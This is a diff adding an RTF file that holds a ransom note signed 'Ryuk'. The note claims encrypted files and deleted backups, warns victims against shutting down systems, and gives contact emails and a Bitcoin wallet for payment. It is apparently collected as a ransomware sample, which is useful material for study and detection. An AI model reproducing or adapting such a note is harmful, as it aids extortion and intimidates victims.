@@ -1,0 +1,35 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2761
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 Your network has been penetrated.\
+\
+All files on each host in the network have been encrypted with a strong algorithm.\
+\
+Backups were either encrypted or deleted or backup disks were formatted.\
+Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.\
+\
+We exclusively have decryption software for your situation\
+No decryption software is available in the public.\
+\
+DO NOT RESET OR SHUTDOWN - files may be damaged.\
+DO NOT RENAME OR MOVE the encrypted and readme files.\
+DO NOT DELETE readme files.\
+This may lead to the impossibility of recovery of the certain files.\
+\
+To get info (decrypt your files) contact us at\
+WayneEvenson@protonmail.com\
+or\
+WayneEvenson@tutanota.com\
+\
+BTC wallet:\
+14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk\
+\
+Ryuk\
+ \
+No system is safe\
+\
+                    }
